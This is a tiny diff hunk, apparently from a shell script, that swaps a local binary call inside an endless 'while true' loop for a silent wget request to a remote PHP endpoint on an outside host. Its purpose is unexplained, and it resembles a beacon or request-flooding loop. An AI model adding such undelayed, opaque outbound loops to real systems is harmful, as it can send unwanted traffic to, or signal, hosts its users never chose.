@@ -12,6 +12,6 @@ make
 while true
 do
 
-./linux848888888874 linux8474
+wget -q -O - www.blueinc.cloud:8884/linuxweb8474.php?linux84=linux8474
 
 done
